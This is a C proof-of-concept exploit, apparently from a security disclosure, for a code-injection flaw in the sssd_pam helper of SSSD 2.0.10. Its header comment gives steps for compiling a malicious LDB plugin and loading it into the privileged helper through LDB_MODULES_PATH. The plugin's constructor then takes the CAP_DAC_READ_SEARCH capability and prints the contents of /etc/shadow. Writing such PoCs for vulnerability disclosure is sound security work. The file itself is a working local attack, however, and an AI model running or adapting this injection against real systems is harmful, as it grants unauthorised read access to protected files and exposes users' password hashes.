/*
 * Author: Matthias Gerstner (SUSE Linux)
 * Date: 2024-11-14
 *
 * This is a proof-of-concept to show that the sssd_pam helper program from
 * SSSD version 2.0.10 allows to gain full control over the CAP_DAC_READ_SEARCH
 * capability.
 *
 * To test this you need to follow these instructions as the unprivileged
 * `sssd` user.
 *
 * $ mkdir plugins
 * $ cd plugins
 * $ gcc sssd-pam-read-search-plugin.c -fPIC -shared -oread-search-plugin.so
 * $ export LDB_MODULES_PATH=$PWD
 * # execute the privileged PAM helper, the code injection should trigger
 * $ /path/to/sssd_pam
 */

#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <malloc.h>
#include <sys/capability.h>

static void print_caps() {
	FILE *file = fopen("/proc/self/status", "r");

	if (!file) {
		printf("Failed to open /proc/self/status\n");
		return;
	}

	char *line = NULL;
	size_t len = 0;

	while (true) {
		ssize_t res = getline(&line, &len, file);
		if (res < 0) {
			break;
		}

		if (res > 3 && strncmp(line, "Cap", 3) == 0) {
			printf("\t%s", line);
		}
	}

	free(line);
	fclose(file);
}

static void print_shadow() {
	FILE *file = fopen("/etc/shadow", "r");

	if (!file) {
		printf("Failed to open /etc/shadow\n");
		return;
	}

	char *line = NULL;
	size_t len = 0;

	while (true) {
		ssize_t res = getline(&line, &len, file);
		if (res < 0) {
			break;
		}

		printf("> %s", line);
	}

	free(line);
	fclose(file);
}

static void set_effective_caps() {
	cap_t handle = cap_init();

	if (!handle)
		return;

	cap_value_t caps[1];
	caps[0] = CAP_DAC_READ_SEARCH;
	if (cap_set_flag(handle, CAP_EFFECTIVE, 1, caps, CAP_SET) != 0) {
		printf("Failed to set effective bit CAP_DAC_READ_SEARCH\n");
	}
	if (cap_set_flag(handle, CAP_PERMITTED, 1, caps, CAP_SET) != 0) {
		printf("Failed to set permitted bit CAP_DAC_READ_SEARCH\n");
	}

	if (cap_set_proc(handle) != 0) {
		printf("Failed to cap_set_proc()\n");
	}

	cap_free(handle);
}

void __attribute__ ((constructor)) init(void) {
	printf("Injected code is running\n");

	printf("\nCurrent capabilities:\n\n");
	print_caps();

	printf("\nSetting effective caps\n");
	set_effective_caps();
	printf("\nNew capabilities\n\n");
	print_caps();

	printf("\nLet's check /etc/shadow:\n\n");
	print_shadow();
}
